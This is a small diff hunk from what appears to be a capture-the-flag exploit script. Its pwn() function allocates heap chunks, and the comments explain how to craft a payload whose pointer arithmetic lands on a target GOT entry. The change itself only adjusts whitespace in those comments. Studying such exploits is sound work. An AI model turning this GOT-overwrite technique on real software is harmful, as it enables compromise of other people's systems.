@@ -50,8 +50,8 @@ def pwn():
 	alloc(0x50, 'D'*8, 'red')
 	alloc(0x50, 'E'*8, 'red')
 	
-	#	 Need to craft the payload in such a way that the
-	# 	 below pointer arithmetic points to the target GOT entry
+	#	Need to craft the payload in such a way that the
+	# 	below pointer arithmetic points to the target GOT entry
 	#
 	# 	mov     rax, qword [rax*8+0x6020e0]
 	#	mov     rdx, qword [rax+0x8]
